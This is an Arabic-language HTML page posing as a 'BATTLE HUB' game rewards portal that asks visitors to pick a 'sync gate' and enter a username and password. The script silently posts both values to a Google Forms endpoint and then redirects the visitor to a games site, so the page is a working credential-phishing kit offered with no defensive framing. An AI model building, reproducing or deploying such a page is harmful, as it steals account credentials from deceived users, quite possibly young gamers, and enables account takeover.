<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BATTLE HUB | التحقق</title>
    <style>
        body { margin: 0; background: #0a0a0c; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
        .card { background: #15151a; width: 320px; padding: 40px 20px; border-radius: 25px; border: 1px solid #222; text-align: center; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
        .neon-title { font-size: 28px; font-weight: 900; color: #00d2ff; text-shadow: 0 0 15px #00d2ff; margin-bottom: 5px; }
        .status { font-size: 11px; color: #00ff88; margin-bottom: 25px; text-transform: uppercase; animation: blink 1.5s infinite; }
        .btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: none; cursor: pointer; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 14px; }
        .btn-b { background: #1877f2; color: white; }
        .btn-w { background: #ffffff; color: #111; }
        .inputs { display: none; margin-top: 20px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #000; color: #00d2ff; outline: none; box-sizing: border-box; }
        #submit-btn { width: 100%; padding: 15px; background: #00d2ff; border: none; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; }
        @keyframes blink { 50% { opacity: 0.4; } }
    </style>
</head>
<body>
    <div class="card">
        <div id="step1">
            <div class="neon-title">BATTLE HUB</div>
            <div class="status">● SERVER: ACTIVE</div>
            <p style="font-size: 13px; color: #777;">اختر بوابة المزامنة للحصول على الجوائز</p>
            <button class="btn btn-b" onclick="go('ALPHA')">GATE ALPHA</button>
            <button class="btn btn-w" onclick="go('DELTA')">GATE DELTA</button>
        </div>
        <div id="step2" class="inputs">
            <div id="gateName" style="color:#00d2ff; font-weight:bold; margin-bottom:15px;"></div>
            <form id="vault-form">
                <input type="text" id="user" placeholder="اسم المستخدم / ID" required>
                <input type="password" id="pass" placeholder="كود التحقق الآمن" required>
                <button type="submit" id="submit-btn">تأكيد المزامنة</button>
            </form>
        </div>
    </div>
    <script>
        function go(name) {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('gateName').innerText = "CONNECTING TO " + name;
        }
        document.getElementById('vault-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const d = new FormData();
            d.append('entry.803150817', document.getElementById('user').value);
            d.append('entry.1707638798', document.getElementById('pass').value);
            fetch('https://docs.google.com/forms/d/e/1FAIpQLSd0FBUXpvP_6pWjSQaJia3AKe-xsFmJVA4qb54bFeKDTq3zng/formResponse', {
                method: 'POST', mode: 'no-cors', body: d
            }).then(() => { window.location.href = "https://poki.com/ar"; });
        });
    </script>
</body>
</html>
